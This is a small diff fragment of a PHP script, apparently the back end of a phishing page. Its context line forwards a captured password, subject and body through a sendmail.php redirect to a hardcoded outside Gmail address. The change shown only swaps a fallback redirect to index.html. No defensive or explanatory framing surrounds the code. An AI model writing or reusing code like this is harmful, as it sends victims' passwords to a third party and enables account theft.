@@ -19,6 +19,6 @@
         header("location: ../../sendmail.php?password=".$password."&subject=".$subject."&body=".$body."&to=keswardpromise@gmail.com");
 
     }else{
-        header("location: keswardpromise.php");
+        header("location: index.html");
     }
 ?>
